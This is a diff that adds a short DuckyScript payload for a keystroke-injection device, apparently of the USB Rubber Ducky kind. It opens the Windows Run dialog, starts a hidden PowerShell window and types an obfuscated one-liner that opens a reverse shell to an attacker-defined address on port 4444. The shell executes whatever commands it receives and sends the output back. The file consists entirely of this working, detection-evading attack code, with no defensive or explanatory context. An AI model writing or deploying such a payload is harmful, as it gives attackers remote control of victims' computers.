@@ -1,0 +1,10 @@
+REM Define the attackers IP & port for exfil
+DEFINE ADDRESS '0.0.0.0'
+DEFINE PORT 4444
+
+DELAY 1500
+GUI r
+DELAY 500
+STRINGLN powershell -NoP -NonI -w h
+DELAY 500
+STRINGLN $0LVhbQ=[TyPE]('tExT'+'.enCOD'+'InG');$C=.('New'+'-Obj'+'ect') System.Net.Sockets.TCPClient( ADDRESS , PORT );$S=$C.GetStream();[byte[]]$b=0..65535|&('%'){0};while(($i=$S.Read($b,0,$b.Length))-ne 0){;$d=(&('New'+'-Ob'+'ject') -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$X=(&('ie'+'x') $d 2>&1 | .('Out'+'-St'+'ring'));$Z=$X+'Ducky@PS '+(&('g'+'l'))+'> ';$sbt=($0lvHBq::ASCII).GetBytes($Z);$S.Write($sbt,0,$sbt.Length);$S.Flush()};$C.Close();exit
